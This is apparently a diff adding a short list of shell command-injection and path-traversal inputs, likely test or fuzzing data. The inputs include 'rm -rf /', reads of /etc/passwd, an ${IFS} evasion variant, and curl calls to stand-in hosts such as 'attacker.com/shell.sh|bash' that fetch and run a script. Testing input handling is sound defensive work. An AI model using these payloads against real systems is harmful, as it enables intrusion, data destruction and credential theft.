@@ -1,0 +1,13 @@
+$(whoami)
+`id`
+; rm -rf /
+| cat /etc/passwd
+&& curl evil.com
+${IFS}cat${IFS}/etc/passwd
+../../etc/passwd
+-rf /
+*
+?
+[abc]
+$(curl attacker.com/shell.sh|bash)
+foo;touch /tmp/pwned
